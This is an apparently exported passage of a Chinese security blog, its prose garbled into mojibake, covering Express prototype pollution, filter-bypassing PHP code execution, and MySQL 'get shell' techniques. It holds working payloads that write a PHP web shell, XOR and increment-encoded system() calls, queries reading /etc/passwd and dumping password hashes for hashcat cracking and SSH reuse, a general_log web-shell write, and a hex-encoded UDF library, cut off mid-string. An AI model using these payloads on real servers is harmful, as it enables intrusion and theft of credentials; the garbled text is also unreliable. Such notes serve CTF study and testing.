¼æ•°ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œå¼€å‘äººå‘˜ä¸ä¼šå®šä¹‰æ­¤å±æ€§ï¼Œå› ä¸ºä»–ä»¬å¯¹é»˜è®¤å€¼æ„Ÿåˆ°æ»¡æ„ï¼Œè¿™ä½¿å…¶å®¹æ˜“å—åˆ°åŸå‹é“¾çš„æ±¡æŸ“ã€‚ å¦‚æœæ‚¨å¯ä»¥è®¿é—®ä»»ä½•ç±»å‹çš„ JSON å“åº”ï¼Œåˆ™å¯ä»¥å°è¯•ä½¿ç”¨è‡ªå·±çš„json spaceså±æ€§æ±¡æŸ“åŸå‹ï¼Œç„¶åé‡æ–°å‘å‡ºç›¸å…³è¯·æ±‚ä»¥æŸ¥çœ‹ JSON ä¸­çš„ç¼©è¿›æ˜¯å¦ç›¸åº”å¢åŠ ã€‚æ‚¨å¯ä»¥æ‰§è¡Œç›¸åŒçš„æ­¥éª¤æ¥åˆ é™¤ç¼©è¿›ä»¥ç¡®è®¤æ¼æ´ã€‚ è¿™æ˜¯ä¸€é¡¹ç‰¹åˆ«æœ‰ç”¨çš„æŠ€æœ¯ï¼Œå› ä¸ºå®ƒä¸ä¾èµ–äºæ‰€åæ˜ çš„ç‰¹å®šå±æ€§ã€‚å®ƒä¹Ÿéå¸¸å®‰å…¨ï¼Œå› ä¸ºæ‚¨åªéœ€å°†å±æ€§é‡ç½®ä¸ºä¸é»˜è®¤å€¼ç›¸åŒçš„å€¼å³å¯æœ‰æ•ˆåœ°æ‰“å¼€å’Œå…³é—­æ±¡æŸ“ã€‚ å°½ç®¡ Express 4.17.4 ä¸­å·²ç»ä¿®å¤äº†åŸå‹æ±¡æŸ“é—®é¢˜ï¼Œä½†æœªå‡çº§çš„ç½‘ç«™å¯èƒ½ä»ç„¶å®¹æ˜“å—åˆ°æ”»å‡»ã€‚ 123&quot;__proto__&quot;:{ &quot;json spaces&quot;:10} é™¤äº†ä¸Šé¢ä»‹ç»çš„ä¿©ç§ï¼›è¿˜æœ‰å­—ç¬¦é›†è¦†ç›–æ–¹æ³•ç­‰ç­‰ ç»•è¿‡è¿‡æ»¤é€ æˆåŸå‹æ±¡æŸ“æœ‰æ—¶ä¼šè¿‡æ»¤__proto__ï¼Œä½†æ˜¯è¿™ç§å…³é”®çš„è¿‡æ»¤æ–¹æ³•å¹¶ä¸æ˜¯ä¸€ä¸ªå¼ºå¤§çš„é•¿æœŸè§£å†³æ–¹æ¡ˆï¼Œå› ä¸ºæœ‰å¤šç§æ–¹æ³•å¯èƒ½ä¼šç»•è¿‡å®ƒã€‚ __proto__èŠ‚ç‚¹åº”ç”¨ç¨‹åºè¿˜å¯ä»¥åˆ†åˆ«ä½¿ç”¨å‘½ä»¤è¡Œæ ‡å¿—--disable-proto=deleteæˆ–æ¥å®Œå…¨ åˆ é™¤æˆ–ç¦ç”¨--disable-proto=throwã€‚ç„¶è€Œï¼Œè¿™ä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨æ„é€ å‡½æ•°æŠ€æœ¯æ¥ç»•è¿‡ã€‚ å®éªŒ å¤šæ¬¡å‘é€json spacesè¯·æ±‚,ä½†æ˜¯å“åº”åŒ…æ²¡æœ‰ååº” æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype); ä¸Šé¢å·²ç»è§£é‡Šçš„å¾ˆæ¸…æ¥šäº† constructor.prototype === __proto__ 12345678910111213let myObject = {}myObject.constructor.prototype.b = 'zIxyd' for(const propertyKey in myObject){ console.log(propertyKey); //b}let myString = &quot;&quot; //zIxydconsole.log(myString.b)console.log(myObject.__proto__) //[Object: null prototype] { b: 'zIxyd' }console.log(myObject.constructor.prototype === myObject.__proto__) //true å°è¯•ä½¿ç”¨constructorï¼› 12345&quot;constructor&quot;: { &quot;prototype&quot;: { &quot;json spaces&quot;:10 }} ToolsServer-Side Prototype Pollution Scanner https://portswigger.net/research/server-side-prototype-pollution","link":"/2024/01/31/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"title":"æ— å­—æ¯æ•°å­—RCE","text":"å–å(~)æµ‹è¯•ä»£ç å¦‚ä¸‹ 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);$code = $_GET['code'];if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$code)){ die(&quot;hacker!&quot;);}eval($code);?&gt; å¤§æ¦‚æ„æ€å°±æ˜¯åˆ©ç”¨ç¬¬ä¸€æ¬¡å–åç»•è¿‡å­—æ¯å’Œæ•°å­—ï¼Œç¬¬äºŒæ¬¡å–åï¼Œå¾—åˆ°åŸæ¥çš„æ•°æ®ï¼› 12345678910111213141516&lt;?php#phpinfo();#(~%8F%97%8F%96%91%99%90)();echo urlencode(~&quot;phpinfo&quot;).&quot;\\n&quot;;#system(&quot;whoami&quot;);#(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);echo urlencode(~&quot;system&quot;).&quot;\\n&quot;;echo urlencode(~&quot;whoami&quot;).&quot;\\n&quot;;#file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php eval($_POST[1]);&quot;)#(~%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C)((~%8C%97%9A%93%93%D1%8F%97%8F),(~%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4%C0%C1));echo urlencode(~&quot;file_put_contents&quot;).&quot;\\n&quot;;echo urlencode(~&quot;shell.php&quot;).&quot;\\n&quot;;echo urlencode(~&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;).&quot;\\n&quot;; æ³¨æ„:ç»è¿‡æµ‹è¯•åªæœ‰åœ¨7.*ç‰ˆæœ¬æ‰å¯ä»¥è¿™ä¹ˆç”¨ï¼Œ5æˆ–8ç‰ˆæœ¬éƒ½ä¸è¡Œï¼Œå¹¶ä¸”åªæœ‰å½“è¯·æ±‚æ–¹å¼ä¸ºGETæ˜¯æ‰æœ‰ç”¨ï¼Œ$_POSTæ²¡ç”¨ å½“æˆ‘å°†ä¸Šé¢çš„çš„è¯·æ±‚æ–¹å¼ä»GETæ›´æ”¹ä¸ºPOST,ä¼šå‘ç°POSTçš„æ•°æ®å†ç¬¬äºŒæ¬¡å–åä¹‹åä¼šåœ¨æ¯ä¸€ä¸ªå­—ç¬¦ä¹‹é—´åŠ ä¸€ä¸ª=ç¬¦å·ï¼› å¼‚æˆ–(^)æµ‹è¯•ä»£ç ä¾æ—§æ˜¯ 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);$code = $_GET['code'];if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$code)){ die(&quot;hacker!&quot;);}eval($code);?&gt; å¼‚æˆ–å¯ä»¥å€ŸåŠ©pythonè„šæœ¬ 1234567891011121314151617181920212223import urllib.parsedef url_encode(url): return urllib.parse.quote(url)valid = &quot;!@$%#^*(){}[];\\'\\&quot;,.&lt;&gt;/?-=_`~ &quot;answer = str(input(&quot;Please input: &quot;))tmp1, tmp2 = '', ''for c in answer: for i in valid: for j in valid: if (ord(i) ^ ord(j) == ord(c)): tmp1 += i tmp2 += j break else: continue breakprint(&quot;tmp1:&quot;,tmp1)print(&quot;tmp2:&quot;,tmp2)print('&quot;'+url_encode(tmp1)+'&quot;^&quot;'+url_encode(tmp2)+'&quot;') payload 123456789phpinfo()#(&quot;%5E%40%5E%40%40%5B%40&quot;^&quot;.%28.%29.%3D/&quot;)();system(&quot;ls&quot;);#(&quot;%5E%24%5E%5E%40%40&quot;^&quot;-%5D-%2A%25-&quot;)(&quot;%40%5E&quot;^&quot;%2C-&quot;);file_put_contents(&quot;a.php&quot;,&quot;&lt;?php eval($_POST[a]);&quot;)#(&quot;%5B%40%40%40%21%5E%2A%5E%21%40%40%40%5E%40%40%5E%5E&quot;^&quot;%3D%29%2C%25~._%2A~%23/.%2A%25.%2A-&quot;)(((&quot;%21&quot;^&quot;%40&quot;).&quot;.&quot;.(&quot;%5E%40%5E&quot;^&quot;.%28.&quot;)),(&quot;&lt;&quot;.(&quot;_%5E%40%5E%40%40%5E%21%40&quot;^&quot;%60.%28.%60%25%28%40%2C&quot;).&quot;(&quot;.(&quot;%7B%21%7D/%28%2A%25%21%23&quot;^&quot;_~-%60%7B~~%40~&quot;).')'.(&quot;%40&quot;^&quot;%7B&quot;))); å¦‚æœå¯ä»¥å¼‚æˆ–çš„å­—ç¬¦å¾ˆå°‘ï¼Œå¯èƒ½æœ‰ä¸€äº›å­—ç¬¦å¼‚æˆ–ä¸å‡ºæ¥(ä¸€èˆ¬éƒ½æ˜¯ä¸€äº›ç‰¹æ®Šå­—ç¬¦)ï¼›é‡åˆ°è¿™ç§æƒ…å†µå¦‚æœwafæ²¡æœ‰è¿‡æ»¤é‚£ä¸ªå¼‚æˆ–ä¸å‡ºæ¥çš„å­—ç¬¦ï¼Œå¯ä»¥ç›´æ¥ç”¨.ç‚¹å·æ‹¼æ¥ï¼›å½“ç„¶ï¼Œæ˜¯åœ¨ç‚¹å¥½å·æ²¡æœ‰è¢«è¿‡æ»¤çš„æå‰ä¸‹ï¼› æ³¨æ„ï¼šç»è¿‡æµ‹è¯•å¼‚æˆ–åœ¨5çš„ç‰ˆæœ¬ä¸è¡Œï¼Œå¯ä»¥åœ¨7.*æˆ–è€…8.*çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”POSTå’ŒGETè¯·æ±‚æ–¹å¼éƒ½å¯ä»¥ï¼› è‡ªå¢(=,+)æµ‹è¯•ä»£ç ä¾æ—§æ˜¯ 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);$code = $_GET['code'];if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$code)){ die(&quot;hacker!&quot;);}eval($code);?&gt; å½“æˆ‘ä»¬é€šè¿‡æŸç§æ–¹æ³•å¯ä»¥å¾—åˆ°ä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è‡ªå¢æ¥è·å–å…¶ä»–å­—ç¬¦ 123456789&lt;?php$_=[];var_dump($_);print(&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;).&quot;\\n&quot;;$_=[].'';var_dump($_);print(&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;).&quot;\\n&quot;;$_=[].'';echo $_[0]; æ„é€ å‡º$_GET[_]($_GET[__]) 12345678910111213141516171819202122232425262728293031&lt;?php$_=[];$_=&quot;$_&quot;; //Array$_=$_['!'=='@']; //[0] å°±æ˜¯å–å­—ç¬¦A$_++;$_++;$_++;$_++;$__=$_++; //E$_++;$___=$_++; //G$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$____=$_++; //Tprint($__).&quot;\\n&quot;;print($___).&quot;\\n&quot;;print($____).&quot;\\n&quot;;$_='_'.$___.$__.$____;print($_).&quot;\\n&quot;;//$$_[_]($$_[__]); //$_GET[_]($_GET[__]);?&gt; å°†ä¸Šé¢çš„ä»£ç åˆæˆä¸€è¡Œï¼›å¦‚ä¸‹ï¼š 1$_=[];$_=&quot;$_&quot;;$_=$_['!'=='@'];$_++;$_++;$_++;$_++;$__=$_++;$_++;$___=$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$____=$_++;$_='_'.$___.$__.$____;$$_[_]($$_[__]); ä½†æ˜¯$_GET[_]($_GET[__]);ä¼¼ä¹åªåœ¨7.*ç‰ˆæœ¬ç®¡ç”¨ï¼› æœ¬æ¥æƒ³æ„é€ evalæ¥ç€çš„ï¼Œå¥½åƒä¸å¤ªè¡Œï¼›æ„é€ system($_GET[_]);ï¼Œ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php$_=[];$_=&quot;$_&quot;; //Array$_=$_['!'=='@']; //[0] å°±æ˜¯å–å­—ç¬¦A$_; //A$_++;$_++;$_++;$_++;$__=$_++; //E$_++;$___=$_++; //G$_++;$_++;$_++;$_++;$_++; //L$________=$_++;//m$_++;$_++;$_++;$_++;$_++;$_______=$_++;//s$____=$_++; //Tprint($__).&quot;\\n&quot;;print($___).&quot;\\n&quot;;print($____).&quot;\\n&quot;;$_____='_'.$___.$__.$____;print($_____).&quot;\\n&quot;; // _GET$_++;$_++;$_++;$_++;$______=$_++; //y$_________=$_______.$______.$_______.$____.$__.$________;//systemprint($_________); 1code=$_=[];$_=&quot;$_&quot;;$_=$_['!'=='@'];$_;$_++;$_++;$_++;$_++;$__=$_++;$_++;$___=$_++;$_++;$_++;$_++;$_++;$_++;$________=$_++;$_++;$_++;$_++;$_++;$_++;$_______=$_++;$____=$_++;$_____='_'.$___.$__.$____;$_++;$_++;$_++;$_++;$______=$_++;$_________=$_______.$______.$_______.$____.$__.$________;$_________($$_____[__]); system($_GET[_])ç¡®å®å¯ä»¥ï¼Œä½†æ˜¯åªèƒ½åœ¨7.*;æŒ‰ç…§åŸç†ä¸åº”è¯¥å—åˆ°ç‰ˆæœ¬é™åˆ¶æ‰å¯¹ï¼Œç»è¿‡æˆ‘æ¼«é•¿çš„æµ‹è¯•ï¼›ç»ˆäºæ‰¾åˆ°äº†åŸå›  åŸæ¥åœ¨5.*çš„ç‰ˆæœ¬$_________($$_____[__]);ä¸­çš„$$_____ä¼šæŠ¥é”™ï¼Œåªéœ€è¦æ”¹æˆ$_=$$_____;$_________($_[__]);å°±å¯ä»¥äº† 1code=$_=[];$_=&quot;$_&quot;;$_=$_['!'=='@'];$_;$_++;$_++;$_++;$_++;$__=$_++;$_++;$___=$_++;$_++;$_++;$_++;$_++;$_++;$________=$_++;$_++;$_++;$_++;$_++;$_++;$_______=$_++;$____=$_++;$_____='_'.$___.$__.$____;$_++;$_++;$_++;$_++;$______=$_++;$_________=$_______.$______.$_______.$____.$__.$________;$_=$$_____;$_________($_[__]); åœ¨æˆ‘æœ¬åœ°çš„5.6æˆåŠŸäº†ï¼Œä½†æ˜¯æˆ‘æœ¬åœ°5.3ä¾ç„¶æ²¡æˆåŠŸ åœ¨8.*çš„ç‰ˆæœ¬[]ä¸­çš„å˜é‡ä¸å¯ä»¥ç”¨_ï¼› æ³¨æ„ï¼šè‡ªå¢æ¯”ä¸Šé¢ä¸¤ç§æ–¹æ³•æ›´éº»çƒ¦;","link":"/2024/01/27/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/"},{"title":"Mysqlå°è®°","text":"å‰ç½®çŸ¥è¯†secure_file_priv è¿™ä¸ªå˜é‡è¢«ç”¨äºé™åˆ¶å¯¼å…¥å’Œå¯¼å‡ºçš„æ•°æ®ç›®å½•ï¼Œæ¯”å¦‚ LOAD DATA å’Œ SELECT ... INTO OUTFILE è¯­å¥ï¼Œä»¥åŠ LOAD_FILE() å‡½æ•°ã€‚è¿™äº›æ“ä½œé™åˆ¶äº†å“ªäº›ç”¨æˆ·æ‹¥æœ‰æ–‡ä»¶æ“ä½œæƒé™ã€‚ secure_file_priv æœ‰äº›è®¾ç½®é€‰é¡¹: å¦‚æœä¸ºç©ºï¼Œä¸åšç›®å½•é™åˆ¶ï¼Œå³ä»»ä½•ç›®å½•å‡å¯ä»¥ã€‚ å¦‚æœæŒ‡å®šäº†ç›®å½•ï¼ŒMySQL ä¼šé™åˆ¶åªèƒ½ä»è¯¥ç›®å½•å¯¼å…¥ã€æˆ–å¯¼å‡ºåˆ°è¯¥ç›®å½•ã€‚ç›®å½•å¿…é¡»å·²å­˜åœ¨ï¼ŒMySQL ä¸ä¼šè‡ªåŠ¨åˆ›å»ºè¯¥ç›®å½•ã€‚ å¦‚æœè®¾ç½®ä¸º NULLï¼ŒMySQL æœåŠ¡å™¨ç¦æ­¢å¯¼å…¥ä¸å¯¼å‡ºåŠŸèƒ½ã€‚ è¯¥å˜é‡çš„é»˜è®¤å€¼ï¼Œæ˜¯ç”±ç¼–è¯‘æ—¶çš„ CMake é€‰é¡¹è€Œå®šï¼Œå…·ä½“å¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚ å› ä¸ºsecure_file_priv æ˜¯åªè¯»å˜é‡ ä¸èƒ½é€šè¿‡ SET GLOBAL variable_name = value; å‘½ä»¤è®¾ç½®ï¼›åªèƒ½é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼› ä¿®æ”¹ my.cnf æ–‡ä»¶ï¼Œåœ¨ [mysqld] å—ä¸‹ï¼Œå¦‚æœæ²¡æœ‰ secure_file_priv åˆ™æ–°å¢ æŒ‡å®šç›®å½•ï¼šsecure_file_priv=/path/to/data ä¸é™ç›®å½•ï¼šsecure_file_priv= ç¦æ­¢æ“ä½œï¼šsecure_file_priv=NULL å¸¸ç”¨å‘½ä»¤123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#åˆ›å»ºä¸€ä¸ªç”¨æˆ·CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';#æˆäºˆFILEæƒé™GRANT FILE ON *.* TO 'zixyd'@'localhost';#æ’¤é”€FILEæƒé™REVOKE FILE ON *.* FROM 'zixyd'@'localhost';#æˆäºˆæ‰€æœ‰æƒé™GRANT ALL PRIVILEGES ON *.* TO 'newuser'@'localhost';#ALL PRIVILEGESæƒé™ åŒ…å«ä¸‹é¢æ‰€æœ‰SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, BINLOG MONITOR, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER, CREATE TABLESPACE, DELETE HISTORY, SET USER, FEDERATED ADMIN, CONNECTION ADMIN, READ_ONLY ADMIN, REPLICATION SLAVE ADMIN, REPLICATION MASTER ADMIN, BINLOG ADMIN, BINLOG REPLAY, SLAVE MONITOR, FILE#è¦æˆäºˆç”¨æˆ· `SELECT` å’Œ `INSERT` æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­å¥ï¼šGRANT SELECT, INSERT ON database_name.* TO 'username'@'localhost';#åˆ·æ–°æƒé™flush privileges;#æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™show grants;#æŸ¥çœ‹å½“å‰ç”¨æˆ·select CURRENT_USER();select user();#æŸ¥çœ‹secure_file_priv show variables like 'secure_file_priv';#åŠ è½½æ–‡ä»¶select load_file(&quot;/etc/passwd&quot;);#å†™å…¥æ–‡ä»¶/å¯¼å‡ºæ•°æ®select &quot;data_content&quot; into outfile &quot;/path/filename&quot;;select &quot;data_content&quot; into dumpfile '/path/filename';#åˆ›å»ºæ•°æ®åº“create database &lt;database_name&gt;; #åˆ é™¤æ•°æ®åº“drop database &lt;database_name&gt;; #åˆ›å»ºæ•°æ®è¡¨create table users ( id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50) NOT NULL, password VARCHAR(100) NOT NULL); #åˆ é™¤æ•°æ®è¡¨DROP TABLE &lt;table_name&gt;; #æ’å…¥æ•°æ®INSERT INTO users (username, password) VALUES ('zhangsan', '123456');#æ›´æ–°æ•°æ®update &lt;table_name&gt; set column1 = value1, column2 = value2 where condition;#åˆ é™¤æ•°æ®delete from &lt;table_name&gt; WHERE condition;#æ·»åŠ åˆ—alter table &lt;table_name&gt; add column new_column_name datatype;#ä¿®æ”¹åˆ—çš„æ•°æ®ç±»å‹ALTER TABLE TABLE_NAME MODIFY COLUMN column_name new_datatype;#ä¿®æ”¹åˆ—çš„åå­—ALTER TABLE table_name CHANGE COLUMN old_column_name new_column_name datatype;#åˆ é™¤åˆ—ALTER TABLE table_name DROP COLUMN column_name;#ä¿®æ”¹è¡¨åALTER TABLE old_table_name RENAME TO new_table_name;#å¯¼å…¥æ•°æ®åº“source /home/abc/abc.sql#æ›´æ”¹å¯ä»¥è¿æ¥çš„åœ°å€ &quot;%&quot;è¡¨ç¤ºä»»æ„åœ°å€use mysqlRENAME USER 'zixyd'@'localhost' TO 'zixyd'@'%';RENAME USER 'zixyd'@'%' TO 'zixyd'@'localhost';#ä½¿ç”¨select user(); ç­‰å‘½ä»¤ä¼¼ä¹ä¸ä¼šåŠæ—¶æ›´æ–°select user,host from user;#ä¿®æ”¹æ•°æ®åº“å¯†ç ALTER USER 'zixyd'@'localhost' IDENTIFIED BY 'newâ€”_password';SET PASSWORD FOR 'cms'@'localhost' = PASSWORD('xuan@tian6'); å¸¸ç”¨å‡½æ•°12345678910111213141516171819202122232425262728293031323334353637#è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç ASCII(s);#è¿”å›å­—ç¬¦ä¸² s çš„å­—ç¬¦æ•°length()#å­—ç¬¦ä¸² s1,s2 ç­‰å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²CONCAT(s1,s2...sn)#å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™UPPER(s)UCASE(s)#ä»å­—ç¬¦ä¸² s çš„ start ä½ç½®æˆªå–é•¿åº¦ä¸º length çš„å­å­—ç¬¦ä¸²SUBSTR(s, start, length) #æ¯”è¾ƒå­—ç¬¦ä¸² s1 å’Œ s2ï¼Œå¦‚æœ s1 ä¸ s2 ç›¸ç­‰è¿”å› 0 ï¼Œå¦‚æœ s1&gt;s2 è¿”å› 1ï¼Œå¦‚æœ s1&lt;s2 è¿”å› -1STRCMP(s1,s2)#è¿”å›å­—ç¬¦ä¸² s çš„å n ä¸ªå­—ç¬¦RIGHT(s,n)#å°†å­—ç¬¦ä¸²sçš„é¡ºåºåè¿‡æ¥REVERSE(s) #å°†å­—ç¬¦ä¸² s2 æ›¿ä»£å­—ç¬¦ä¸² s ä¸­çš„å­—ç¬¦ä¸² s1REPLACE(s,s1,s2) # ä»å­—ç¬¦ä¸² s çš„ n ä½ç½®æˆªå–é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²ï¼ŒåŒ SUBSTRING(s,n,len)MID(s,n,len) #å°†å­—ç¬¦ä¸² s çš„æ‰€æœ‰å­—æ¯å˜æˆå°å†™å­—æ¯LOWER(s)LCASE(s) #è¿”å›å­—ç¬¦ä¸² s çš„å‰ n ä¸ªå­—ç¬¦LEFT(s,n) é…ç½®æ–‡ä»¶123456789#æ–‡ä»¶è·¯å¾„/etc/mysql/my.cnf [mysqld]#ç›‘å¬çš„åœ°å€bind-address=0.0.0.0#fileæƒé™å¯ä»¥æ“ä½œçš„ç›®å½•secure_file_priv = /path/to/data Mysql GET ShellSSHè¿æ¥å¾ˆå¤šäººå› ä¸ºè¦è®°å¾—å¯†ç å¤ªå¤šï¼Œæ‰€ä»¥ä¼šé‡å¤ä½¿ç”¨åŒä¸€ä¸ªå¯†ç ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨çˆ†ç ´å‡ºæ¥çš„æ•°æ®åº“å¯†ç å°è¯•å»è¿æ¥ sshæœåŠ¡ 123456789#æŸ¥è¯¢ç”¨æˆ·åä¸º'zixyd'çš„æ•°æ®åº“å¯†ç # MySQL &lt;= 5.6 ç‰ˆæœ¬select host, user, password from mysql.user;# MySQL &gt;= 5.7 ç‰ˆæœ¬SELECT host, user, authentication_string, plugin FROM mysql.user WHERE user = 'zixyd';#ä½¿ç”¨hashcatçˆ†ç ´hashcat hash -m 300 /usr/share/wordlists/rockyou.txt æ—¥å¿—å†™shellMySQL 5.0 ç‰ˆæœ¬ä»¥ä¸Šä¼šåˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ—¥å¿—çš„å…¨å±€å˜é‡æ¥ Getshell 123456789101112131415161718192021222324#æŸ¥çœ‹æ—¥å¿—åŠŸèƒ½æ˜¯å¦å¼€å¯ä»¥åŠæ—¥å¿—æ–‡ä»¶è·¯å¾„MariaDB [(none)]&gt; SHOW VARIABLES LIKE 'general%';+------------------+----------+| Variable_name | Value |+------------------+----------+| general_log | OFF || general_log_file | kali.log |+------------------+----------+2 rows in set (0.001 sec)#å¼€å¯æ—¥å¿—åŠŸèƒ½set global general_log = &quot;ON&quot;;#è®¾ç½®æ—¥å¿—æ–‡ä»¶è·¯å¾„set global general_log_file='/var/www/html/shell.php';#æ—¥å¿—æ–‡ä»¶è·¯å¾„æ˜¯ä¸å— secure_file_priv çš„é™åˆ¶çš„show variables like 'secure_file_priv';#å¾€æ—¥å¿—æ–‡ä»¶ä¸­å†™å…¥æœ¨é©¬select '&lt;?php @eval($_POST['password']);?&gt;';#å…¶å®è¿™ç§æ–¹å¼ä¹Ÿæ¯”è¾ƒé¸¡è‚‹;å› ä¸ºmysqlç”¨æˆ·é»˜è®¤æ˜¯å¯¹/var/www/html/ ç›®å½•æ²¡æœ‰å†™çš„æƒé™çš„;#å³ä½¿æœ‰å†™çš„æƒé™,mysqlæ—¥å¿—æ–‡ä»¶çš„æƒé™é»˜è®¤ä¸º 660 ; www-dataç”¨æˆ·ä¹Ÿæ²¡æœ‰è¯»çš„æƒé™; UDFè‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ã€‚ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å¯ä»¥å®ç°åœ¨ MySQL ä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨ SQL è¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•° version () ç­‰æ–¹ä¾¿ã€‚ å¦‚æœå¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªç±»ä¼¼äºsystemçš„å‡½æ•°ï¼Œå°±å¯ä»¥æ‰§è¡Œshellå‘½ä»¤; å¦‚æœæ˜¯ MySQL &gt;= 5.1 çš„ç‰ˆæœ¬ï¼Œå¿…é¡»æŠŠ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®äº MySQL å®‰è£…ç›®å½•ä¸‹çš„ lib\\plugin æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•° 1234567891011121314#æŸ¥çœ‹pluginçš„è·¯å¾„,ä¸€èˆ¬éƒ½æ˜¯/usr/lib/mysql/plugin/show variables like '%plugin%';#linux 64 ä¸‹SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d7000